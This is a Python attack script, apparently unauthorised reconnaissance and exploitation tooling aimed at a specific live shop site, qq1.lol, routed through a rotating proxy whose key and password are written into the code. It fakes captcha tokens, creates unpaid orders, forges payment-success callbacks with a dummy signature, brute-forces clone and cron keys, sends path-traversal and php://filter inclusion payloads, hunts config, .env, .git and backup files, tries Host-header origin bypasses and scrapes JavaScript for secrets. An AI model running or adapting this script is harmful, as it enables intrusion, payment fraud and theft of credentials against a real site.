#!/usr/bin/env python3
"""qq1 deep9 — pivot away from /sup: novel acts, pay, findpwd, origin, LFI, clone, OSINT."""
import json
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep9")
OUT.mkdir(exist_ok=True)
LOG = OUT / "deep9.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "c.jar")
REPORT = OUT / "report.json"
QG, PW = "C413ED6D", "344F550A6F8B"
_px = None
R = {"hits": [], "notes": []}


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:8000], "ts": time.time()}
    R["hits"].append(rec)
    open(HITS, "a").write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:280]}")


def fresh():
    global _px
    for area in ("440000", "0", "330000", "320000", "510000"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10",
                 f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS" or not d.get("data"):
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", "--max-time", "10",
                     f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                    text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t9.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t9.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px err {e}")
        time.sleep(0.8)
    return _px


def curl(url, post=None, headers=None, mt=20, jar=True, follow=False):
    global _px
    if not _px:
        fresh()
    for attempt in range(5):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px,
               "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
               "-H", "Referer: https://qq1.lol/",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if jar:
            cmd += ["-b", JAR, "-c", JAR]
        if follow:
            cmd.append("-L")
        for k, v in (headers or {}).items():
            cmd += ["-H", f"{k}: {v}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 8).stdout or ""
        except Exception as e:
            log(f"curl exc {e}"); fresh(); continue
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh(); continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def csrf_and_hashsalt(html):
    csrf = None
    m = re.search(r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)', html or "")
    if m:
        csrf = m.group(1)
    if not csrf:
        m = re.search(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)', html or "", re.I)
        if m:
            csrf = m.group(1)
    hs = None
    m = re.search(r"var hashsalt=(.+);", html or "")
    if m:
        try:
            hs = subprocess.run(
                ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
                capture_output=True, text=True, timeout=5).stdout.strip()
        except Exception:
            hs = m.group(1).strip().strip("'\"")
    return csrf, hs


def section_novel_acts():
    log("=== NOVEL ACTS ===")
    Path(JAR).unlink(missing_ok=True)
    home, _ = curl(BASE + "/")
    csrf, hs = csrf_and_hashsalt(home)
    log(f"csrf={bool(csrf)} hs={bool(hs)}")

    # create unpaid order for refund/fill tests
    orderid = None
    if hs:
        pay = {
            "tid": "102", "num": "1", "inputvalue": "deep9tg@" + str(int(time.time()) % 100000),
            "hashsalt": hs,
            "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
        }
        if csrf:
            pay["csrf_token"] = csrf
        b, c = curl(BASE + "/ajax.php?act=pay", pay)
        log(f"pay create: {c} {b[:200]}")
        try:
            j = json.loads(b)
            orderid = j.get("trade_no") or j.get("orderid") or j.get("id")
            if orderid:
                hit("order_created", str(orderid), b)
        except Exception:
            pass

    acts = [
        ("gift_start", {}),
        ("gift_stop", {}),
        ("fill", {"orderid": orderid or "1", "hashsalt": hs or "x"}),
        ("apply_refund", {"orderid": orderid or "1", "hashsalt": hs or "x", "reason": "test"}),
        ("SharePoster", {"tid": "102"}),
        ("share_invitegift_link", {}),
        ("getshareid", {"url": "http://127.0.0.1/", "hashsalt": hs or "x"}),
        ("getrizhi", {"tid": "102"}),
        ("getleftcount", {"tid": "102"}),
        ("payrmb", {"orderid": orderid or "1"}),
        ("cart_list", {}),
        ("cart_info", {}),
        ("checklogin", {}),
        ("gettool", {"cid": "4"}),
        ("gettoolnew", {"cid": "4"}),
        ("query", {"qq": "123456789"}),
        ("query", {"data": orderid or "1"}),
        ("order", {"id": "25949", "skey": "0"}),
        ("changepwd", {"id": "25949", "skey": "0", "pwd": "x"}),
        ("captcha", {}),
        ("notify", {}),
        ("upload", {}),
        ("config", {}),
        ("admin", {}),
        ("kami", {}),
        ("export", {}),
        ("getorder", {"id": orderid or "1"}),
        ("orderlist", {}),
        ("getuser", {}),
        ("userinfo", {}),
        ("recharge", {"money": "1"}),
        ("withdraw", {"money": "1"}),
        ("getmoney", {}),
        ("getsite", {}),
        ("getconfig", {}),
        ("siteinfo", {}),
        ("login", {"user": "a", "pass": "b"}),
        ("reg", {"user": "a", "pwd": "b"}),
        ("reguser", {"user": "a", "pwd": "b"}),
        ("quickreg", {}),
        ("sendcode", {"qq": "123456789"}),
        ("findpwd", {"user": "admin"}),
        ("resetpwd", {"user": "admin"}),
        ("workorder", {}),
        ("invite", {}),
        ("coupon", {"code": "TEST"}),
        ("cut", {}),
        ("seckill", {}),
        ("groupbuy", {}),
    ]
    for act, extra in acts:
        post = dict(extra)
        if csrf and act not in ("getcount", "getclass", "gettool", "gettoolnew", "getleftcount",
                                 "checklogin", "getshuoshuo", "getshareid", "gift_start", "query",
                                 "order", "cart_info", "cart_list", "captcha"):
            post.setdefault("csrf_token", csrf)
        if hs and "hashsalt" not in post and act in ("fill", "apply_refund", "pay", "cancel", "getshareid"):
            post["hashsalt"] = hs
        for path in (f"/ajax.php?act={act}", f"/user/ajax.php?act={act}"):
            b, c = curl(BASE + path, post if post else None)
            interesting = b and c == "200" and "No Act" not in b and "_guard" not in b
            short = (b or "")[:160].replace("\n", " ")
            log(f"  {path}: {c} {short}")
            if interesting and any(k in (b or "") for k in (
                    "code\":0", "code\":1", "成功", "key", "kami", "card", "password",
                    "http://", "https://", "trade_no", "money", "user", "sitename")):
                if "验证失败" not in b and "请先" not in b and "登录" not in b:
                    hit("novel_act", f"{path} {extra}", b)
            time.sleep(0.25)


def section_api_surface():
    log("=== API SURFACE ===")
    api_acts = [
        "siteinfo", "classlist", "goodslist", "tools", "clone", "change", "orders",
        "search", "pay", "token", "notify", "query", "kami", "export", "user",
        "login", "reg", "getcount", "getclass", "gettool", "upload", "config",
        "goods", "order", "refund", "price", "stock", "supplier", "fenzhan",
        "dock", "shequ", "card", "cards", "kmlist", "addkm", "delkm",
    ]
    for act in api_acts:
        b, c = curl(f"{BASE}/%61pi.php?act={act}")
        short = (b or "")[:140].replace("\n", " ")
        log(f"  api {act}: {c} {short}")
        if b and c == "200" and "No Act" not in b and "No Act!" not in b:
            if any(x in b for x in ("sitename", "\"tid\"", "\"cid\"", "成功", "kami", "http")):
                if "错误" not in b and "NEEDAUTH" not in b and "请提供" not in b and "Incorrect" not in b:
                    hit("api_open", act, b)
            elif "No key" in b or "Invalid key" in b or "密钥" in b or "NEEDAUTH" in b:
                R["notes"].append(f"api {act} needs auth: {short}")
        time.sleep(0.2)

    # clone formula variants with operator-ish keys
    log("=== CLONE KEY VARIANTS ===")
    import hashlib
    seeds = ["qq1", "qq1.lol", "buyi", "buyiq", "qqkqq", "QQKZC", "布衣", "faka",
             "caihong", "123456", "admin", "qqkzc", "ka1", "ka1.one"]
    for s in seeds:
        for formula in [
            s, hashlib.md5(s.encode()).hexdigest(),
            hashlib.md5((s + "qq1.lol").encode()).hexdigest(),
            hashlib.md5(("qq1.lol" + s).encode()).hexdigest(),
        ]:
            b, c = curl(f"{BASE}/%61pi.php?act=clone&key={urllib.parse.quote(formula)}")
            if b and "克隆密钥错误" not in b and "错误" not in b and "No Act" not in b:
                hit("clone_key", formula, b)
            time.sleep(0.15)


def section_pay_deep():
    log("=== PAY DEEP ===")
    Path(JAR).unlink(missing_ok=True)
    home, _ = curl(BASE + "/")
    csrf, hs = csrf_and_hashsalt(home)
    # try all known tids for stock
    tids = ["102", "4", "118", "83", "103", "104", "160", "10", "11", "5", "1", "2", "3"]
    for tid in tids:
        pay = {
            "tid": tid, "num": "1",
            "inputvalue": "paydeep@" + str(int(time.time()) % 100000),
            "hashsalt": hs or "x",
            "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
        }
        if csrf:
            pay["csrf_token"] = csrf
        b, c = curl(BASE + "/ajax.php?act=pay", pay)
        log(f"  pay tid={tid}: {c} {(b or '')[:120]}")
        if b and "trade_no" in b:
            hit("stocked_tid", tid, b)
            try:
                j = json.loads(b)
                tn = j.get("trade_no")
            except Exception:
                tn = None
            if tn:
                for typ in ("alipay", "qqpay", "wxpay", "usdt", "rmb", "epay"):
                    b2, c2 = curl(f"{BASE}/other/submit.php?type={typ}&orderid={tn}")
                    log(f"    submit {typ}: {c2} len={len(b2 or '')} {(b2 or '')[:100].replace(chr(10),' ')}")
                    (OUT / f"submit_{tid}_{typ}.html").write_text(b2 or "", errors="replace")
                    if b2 and any(x in b2 for x in ("form", "alipay", "payurl", "http", "MCHID", "pid", "sign")):
                        hit("pay_submit", f"{tid}/{typ}/{tn}", b2[:2000])
                    # follow alipay.php
                    if typ == "alipay":
                        b3, c3 = curl(f"{BASE}/other/alipay.php?trade_no={tn}")
                        log(f"    alipay.php: {c3} len={len(b3 or '')}")
                        (OUT / f"alipay_{tn}.html").write_text(b3 or "", errors="replace")
                        if b3 and len(b3) > 50:
                            hit("alipay_body", tn, b3[:3000])
                        # dump response headers for Location
                        hdr = subprocess.run(
                            ["curl", "-skI", "--max-time", "15", "-x", _px,
                             "-H", "Referer: https://qq1.lol/",
                             f"{BASE}/other/alipay.php?trade_no={tn}"],
                            capture_output=True, text=True, timeout=20).stdout
                        log(f"    alipay headers:\n{hdr[:500]}")
                        if "Location" in hdr or "pid=" in (b3 or ""):
                            hit("alipay_redirect", tn, hdr + "\n" + (b3 or "")[:1000])
            break  # one stocked order enough for channel dump
        time.sleep(0.3)

    # notify forge probes with common epay fields
    log("=== NOTIFY FORGE ===")
    for path in [
        "/other/epay_notify.php", "/other/epay_return.php",
        "/other/alipay_notify.php", "/other/wxpay_notify.php",
        "/other/qqpay_notify.php", "/other/notify.php",
        "/other/epay_notify.php?",
    ]:
        params = {
            "pid": "1000", "trade_no": "20260720145603146", "out_trade_no": "20260720145603146",
            "type": "alipay", "name": "test", "money": "0.01", "trade_status": "TRADE_SUCCESS",
            "sign": "0", "sign_type": "MD5",
        }
        b, c = curl(BASE + path.split("?")[0], params)
        log(f"  notify POST {path}: {c} {(b or '')[:100]}")
        b2, c2 = curl(BASE + path.split("?")[0] + "?" + urllib.parse.urlencode(params))
        log(f"  notify GET {path}: {c2} {(b2 or '')[:100]}")
        if b and b.strip() in ("success", "SUCCESS", "ok", "OK"):
            hit("notify_success", path, b)


def section_findpwd_user():
    log("=== FINDPWD / QRLOGIN ===")
    for p in ["/user/findpwd.php", "/sup/findpwd.php", "/user/connect.php"]:
        b, c = curl(BASE + p)
        log(f"  {p}: {c} len={len(b or '')}")
        (OUT / (p.strip("/").replace("/", "_") + ".html")).write_text(b or "", errors="replace")
        # extract js urls / qrlogin
        for m in re.findall(r'src=["\']([^"\']+\.js[^"\']*)', b or ""):
            log(f"    js {m}")
        for m in re.findall(r'(qrlogin[^"\']*|getqrpic[^"\']*|ajax\.php\?act=[^"\']+)', b or ""):
            log(f"    ref {m}")

    # user findpwd ajax guesses
    for act in ("findpwd", "sendcode", "resetpwd", "checkuser", "getqrpic", "qrlogin"):
        for base in ("/user/ajax.php", "/ajax.php", "/sup/ajax.php"):
            b, c = curl(f"{BASE}{base}?act={act}", {"user": "admin", "qq": "123456"})
            if b and "No Act" not in b:
                log(f"  {base}?act={act}: {c} {(b or '')[:120]}")
                if "成功" in b or "code\":0" in b or "code\":1" in b:
                    hit("findpwd_act", f"{base}?act={act}", b)

    # sup qrlogin
    b, c = curl(BASE + "/sup/qrlogin.php?do=getqrpic")
    log(f"  getqrpic: {c} {(b or '')[:200]}")
    (OUT / "qrpic.json").write_text(b or "", errors="replace")
    if b and ("qrcode" in b or "qrsig" in b or "image" in b):
        hit("qrlogin_pic", "getqrpic", b[:500])


def section_origin_host():
    log("=== ORIGIN / HOST ===")
    ips = ["45.158.21.213", "103.43.11.95"]
    paths = ["/", "/config.php", "/includes/common.php", "/includes/config.php",
             "/%61pi.php?act=siteinfo", "/ajax.php?act=getcount", "/.env", "/.git/HEAD"]
    for ip in ips:
        for path in paths:
            for host in ("qq1.lol", "www.qq1.lol", ip, "localhost", "127.0.0.1"):
                url = f"https://{ip}{path}"
                b, c = curl(url, headers={"Host": host}, jar=False)
                # also try without SNI issues via --resolve style already using IP
                short = (b or "")[:80].replace("\n", " ")
                if c not in ("000", "403", "404", "502", "503") and b:
                    if "sitename" in b or "yxts" in b or "DB_" in b or "mysql" in b.lower() or "SYS_KEY" in b:
                        hit("origin_leak", f"{ip} Host={host} {path}", b[:2000])
                    elif c == "200" and len(b) > 0 and "Forbidden" not in b and "Not Found" not in b:
                        log(f"  interesting {ip} H={host} {path}: {c} len={len(b)} {short}")
            time.sleep(0.1)


def section_lfi_mod():
    log("=== MOD / TEMPLATE LFI ===")
    payloads = [
        "query", "fenlei", "cutshop", "groupshop", "seckill", "coupon", "so",
        "panel", "admin", "workorder", "login", "reg",
        "../config", "../../config", "....//....//config",
        "query/../../config", "query%00", "query.php",
        "/etc/passwd", "php://filter/convert.base64-encode/resource=config",
        "....//includes/common",
    ]
    for mod in payloads:
        b, c = curl(f"{BASE}/?mod={urllib.parse.quote(mod, safe='')}")
        short = (b or "")[:100].replace("\n", " ")
        log(f"  mod={mod}: {c} len={len(b or '')} {short}")
        if b and any(x in b for x in ("root:", "DB_HOST", "SYS_KEY", "<?php", "mysql")):
            hit("lfi", mod, b[:3000])
        time.sleep(0.15)


def section_config_quirk():
    log("=== CONFIG QUIRK ===")
    quirks = [
        "/config.php", "/config.php/", "/config.php/.", "/config.php%20",
        "/config.php.bak", "/config.php~", "/config.php.swp", "/config.php.old",
        "/config.php.txt", "/config.php.save", "/config.php.orig",
        "/includes/config.php", "/includes/config.php/",
        "/includes/common.php", "/includes/common.php/",
        "/.env", "/.env.local", "/.git/config", "/.git/HEAD",
        "/composer.json", "/composer.lock", "/package.json",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/admin.php", "/manage.php", "/backend/", "/console/",
        "/doc.php", "/docs/", "/api/doc", "/swagger.json",
        "/backup.sql", "/dump.sql", "/qq1.sql", "/1.sql",
        "/www.zip", "/web.zip", "/backup.zip", "/site.tar.gz",
        "/uploads/", "/upload/", "/assets/", "/template/",
        "/includes/", "/includes/pages/", "/includes/lib/",
    ]
    for p in quirks:
        b, c = curl(BASE + p, jar=False)
        log(f"  {p}: {c} len={len(b or '')}")
        if c == "200" and b and any(x in b for x in ("<?php", "DB_", "SYS_KEY", "password", "mysql", "root:", "[core]")):
            hit("source_leak", p, b[:4000])
        elif c == "200" and (b is not None) and len(b) == 0:
            R["notes"].append(f"empty200 {p}")
        time.sleep(0.12)


def section_related():
    log("=== RELATED HOSTS ===")
    hosts = [
        "https://ka1.one", "http://ka1.one",
        "https://qqkqq.com", "http://qqkqq.com",
        "https://fffzz.lol", "http://fffzz.lol",
        "https://htqq.lol", "http://htqq.lol",
        "https://hmjf.lol", "https://kln166.com",
        "https://qq0.lol", "https://buyi.lol",
        "https://t.me/QQKZC", "https://t.me/buyiq", "https://t.me/qqkqq", "https://t.me/buyi",
    ]
    for h in hosts:
        b, c = curl(h, jar=False, follow=True, mt=15)
        title = ""
        m = re.search(r"<title>([^<]+)", b or "", re.I)
        if m:
            title = m.group(1).strip()
        log(f"  {h}: {c} len={len(b or '')} title={title[:60]}")
        (OUT / ("rel_" + re.sub(r"[^\w.-]+", "_", h)[:80] + ".html")).write_text((b or "")[:50000], errors="replace")
        if "sitename" in (b or "") or "getcount" in (b or "") or "发卡" in (b or "") or "彩虹" in (b or ""):
            hit("related_live", h, (b or "")[:1500])
        # if faka-like, probe api
        if c == "200" and h.startswith("http") and "t.me" not in h:
            for path in ["/%61pi.php?act=siteinfo", "/ajax.php?act=getcount", "/sup/login.php"]:
                b2, c2 = curl(h.rstrip("/") + path, jar=False)
                if b2 and ("sitename" in b2 or "yxts" in b2 or "供货商" in b2):
                    hit("related_faka", h + path, b2[:2000])
        time.sleep(0.3)


def section_js_secrets():
    log("=== JS SECRETS ===")
    for path in ["/assets/js/main.js", "/assets/faka/js/faka.js",
                 "/assets/js/user.js", "/user/assets/js/reguser.js",
                 "/user/assets/js/login.js", "/sup/assets/js/login.js"]:
        b, c = curl(BASE + path, jar=False)
        if not b or c != "200":
            continue
        (OUT / ("js_" + path.strip("/").replace("/", "_"))).write_text(b, errors="replace")
        # extract interesting strings
        keys = set(re.findall(r'(?i)(?:api[_-]?key|secret|password|sys_key|token|sign|pid|merchant)["\'\s:=]+([A-Za-z0-9_\-]{6,64})', b))
        urls = set(re.findall(r'https?://[^\s"\'<>]+', b))
        acts = sorted(set(re.findall(r'act=([a-zA-Z0-9_]+)', b)))
        log(f"  {path}: keys={list(keys)[:10]} acts={acts[:20]} urls={len(urls)}")
        for k in keys:
            hit("js_key", f"{path}:{k}", k)
        for u in urls:
            if any(x in u for x in ("api", "pay", "epay", "alipay", "telegram", "t.me", "qq.com")):
                hit("js_url", path, u)


def section_cron_doc():
    log("=== CRON / DOC ===")
    cron_keys = [
        "123456", "admin", "cron", "monitor", "qq1", "buyi", "qqkqq", "faka",
        "caihong", "password", "666666", "888888", "000000", "111111",
        "qq1.lol", "buyiq", "qqkzc", "cronkey", "key", "test", "pass",
    ]
    for k in cron_keys:
        b, c = curl(f"{BASE}/cron.php?key={urllib.parse.quote(k)}")
        log(f"  cron {k}: {c} {(b or '')[:80]}")
        if b and "不正确" not in b and "错误" not in b and b.strip():
            hit("cron_key", k, b)
        time.sleep(0.2)

    for p in ["/doc.php", "/docs.php", "/api.php?act=help", "/%61pi.php?act=help",
              "/readme.md", "/README.md", "/CHANGELOG.md"]:
        b, c = curl(BASE + p, jar=False)
        log(f"  {p}: {c} len={len(b or '')}")


def main():
    open(LOG, "w").write("")
    open(HITS, "w").write("")
    log("=== DEEP9 PIVOT START ===")
    fresh()
    try:
        section_js_secrets()
    except Exception as e:
        log(f"js err {e}")
    try:
        section_novel_acts()
    except Exception as e:
        log(f"novel err {e}")
    try:
        section_api_surface()
    except Exception as e:
        log(f"api err {e}")
    try:
        section_pay_deep()
    except Exception as e:
        log(f"pay err {e}")
    try:
        section_findpwd_user()
    except Exception as e:
        log(f"findpwd err {e}")
    try:
        section_config_quirk()
    except Exception as e:
        log(f"config err {e}")
    try:
        section_lfi_mod()
    except Exception as e:
        log(f"lfi err {e}")
    try:
        section_origin_host()
    except Exception as e:
        log(f"origin err {e}")
    try:
        section_related()
    except Exception as e:
        log(f"related err {e}")
    try:
        section_cron_doc()
    except Exception as e:
        log(f"cron err {e}")

    REPORT.write_text(json.dumps(R, ensure_ascii=False, indent=2))
    log(f"=== DEEP9 DONE hits={len(R['hits'])} notes={len(R['notes'])} ===")


if __name__ == "__main__":
    main()
